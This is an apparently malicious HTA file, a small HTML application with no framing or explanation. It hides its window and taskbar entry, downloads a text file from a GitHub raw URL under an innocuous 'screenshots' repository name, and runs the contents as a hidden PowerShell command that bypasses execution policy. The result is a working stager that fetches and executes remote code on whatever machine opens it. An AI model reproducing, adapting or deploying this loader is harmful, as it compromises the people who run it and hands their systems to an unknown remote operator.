<html><head><title>a</title><hta:application showintaskbar="no" border="none"/></head><script language=JScript>var x=new ActiveXObject("MSXML2.XMLHTTP");x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/init.txt",0);x.send();new ActiveXObject("WScript.Shell").Run("powershell -NoP -Ex Bypass -c \""+x.responseText.replace(/\n/g,";")+"\"",0);</script></body></html>